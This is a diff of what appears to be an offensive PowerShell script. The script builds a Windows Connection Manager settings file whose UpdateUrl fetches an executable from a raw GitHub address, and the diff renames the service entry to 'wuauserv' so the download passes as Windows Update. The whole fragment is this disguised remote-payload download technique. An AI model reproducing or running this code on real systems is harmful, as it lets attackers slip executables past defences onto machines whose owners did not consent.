@@ -16,7 +16,7 @@ Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
 CMSFile=settings.txt
-ServiceName=WindowsUpdate
+ServiceName=wuauserv
 TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
